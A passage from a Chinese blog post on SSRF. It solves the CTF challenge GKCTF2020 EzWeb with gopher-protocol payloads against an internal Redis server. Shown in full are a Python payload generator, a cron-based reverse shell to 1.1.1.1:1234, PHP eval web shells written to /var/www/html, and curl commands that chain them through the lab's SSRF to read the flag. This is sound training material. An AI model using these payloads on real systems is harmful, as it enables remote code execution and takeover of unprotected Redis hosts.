class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x in redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x in cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="keyword">print</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>好像不行！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%2A&#x2F;1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;10.82.232.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%2A&#x2F;1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn&#x2F;index.php?url&#x3D;gopher:&#x2F;&#x2F;10.82.232.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2467%0D%0A%0A%0A%2A&#x2F;1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20&#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn&#x2F;index.php?url&#x3D;gopher:&#x2F;&#x2F;10.82.232.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2433%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_POST%5Bupload%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
+
+
+
+<?php @eval($_GET[1]);?>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn&#x2F;index.php?url&#x3D;gopher:&#x2F;&#x2F;10.82.232.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2428%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_GET%5B1%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里需要绕过一下空格否则会400 Bad Request</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn&#x2F;index.php?url&#x3D;10.82.232.11&#x2F;shell.php?1&#x3D;system(&#39;cat$IFS$9&#x2F;flag&#39;);&amp;submit&#x3D;%E6%8F%90%E4%BA%A4</span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者直接在框里输入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;10.82.232.11&#x2F;shell.php?1&#x3D;system(&#39;cat%20&#x2F;flag&#39;);</span><br><span class="line"></span><br><span class="line">%20绕过！！！</span><br></pre></td></tr></table></figure>
+
+<p>这空格也太恶心了！🙄</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -v http:&#x2F;&#x2F;f29908c5-b09f-4a7a-8adb-e987183490be.node3.buuoj.cn&#x2F;index.php?url&#x3D;gopher:&#x2F;&#x2F;10.82.232.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20echo%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/">http://upload.love/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a></div><div class="post_share"><div class="social-share" data-image="/image/236.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/26/BUUCTF-17/"><img class="prev-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">BUUCTF17</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/24/BUUCTF-16/"><img class="next-cover" data-lazy-src="/image/ttt.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BUUCTF16</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/29/BUUCTF-19/" title="BUUCTF19"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">BUUCTF19</div></div></a></div><div><a href="/2021/01/01/BUUCTF-2/" title="BUUCTF2"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-01</div><div class="title">BUUCTF2</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%AE%80%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.0.1.</span> <span class="toc-text">常简存在SSRF漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php"><span class="toc-number">1.0.1.1.</span> <span class="toc-text">php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java"><span class="toc-number">1.0.1.2.</span> <span class="toc-text">java</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.0.2.</span> <span class="toc-text">SSRF支持的协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E5%A4%A7%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">各大协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Gopher-%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">2.1.</span> <span class="toc-text">利用 Gopher 协议拓展攻击面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">2.2.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CGI%E3%80%81FCGI%E3%80%81php-cgi%E3%80%81php-fpm%E6%A6%82%E5%BF%B5%E8%A7%A3%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">CGI、FCGI、php-cgi、php-fpm概念解析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0"><span class="toc-number">3.</span> <span class="toc-text">学习文章</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.</span> <span class="toc-text">协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.1.</span> <span class="toc-text">file协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.1.2.</span> <span class="toc-text">dict协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E3%80%81ftps"><span class="toc-number">3.1.3.</span> <span class="toc-text">ftp、ftps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tftp"><span class="toc-number">3.1.4.</span> <span class="toc-text">tftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#imap-imaps-pop3-pop3s-smtp-smtps"><span class="toc-number">3.1.5.</span> <span class="toc-text">imap&#x2F;imaps&#x2F;pop3&#x2F;pop3s&#x2F;smtp&#x2F;smtps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#telnet"><span class="toc-number">3.1.6.</span> <span class="toc-text">telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-smbs"><span class="toc-number">3.1.7.</span> <span class="toc-text">smb&#x2F;smbs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gopher"><span class="toc-number">3.1.8.</span> <span class="toc-text">Gopher</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher%E3%80%81dict%E5%8D%8F%E8%AE%AE%E4%BB%A5%E5%8F%8Aredis%E6%9C%8D%E5%8A%A1%E3%80%81Curl-%E5%91%BD%E4%BB%A4"><span class="toc-number">4.0.1.</span> <span class="toc-text">gopher、dict协议以及redis服务、Curl 命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E7%BD%91IP%E6%AE%B5"><span class="toc-number">4.0.2.</span> <span class="toc-text">常见内网IP段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-number">4.1.</span> <span class="toc-text">利用方法：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GKCTF2020-EZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb"><span class="toc-number">6.</span> <span class="toc-text">[GKCTF2020]EZ三剑客-EzWeb</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE-secret"><span class="toc-number">6.1.</span> <span class="toc-text">访问?secret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">6.2.</span> <span class="toc-text">file:读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E5%86%85%E7%BD%91ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.3.</span> <span class="toc-text">爆内网ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf-%E6%89%93redis"><span class="toc-number">6.4.</span> <span class="toc-text">ssrf 打redis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E4%BD%AC%E7%9A%84exp"><span class="toc-number">6.4.1.</span> <span class="toc-text">大佬的exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">6.4.2.</span> <span class="toc-text">反弹shell</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/01/25/SSRF%E5%AD%A6%E4%B9%A0/'
+    this.page.identifier = '2021/01/25/SSRF学习/'
+    this.page.title = 'SSRF学习'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
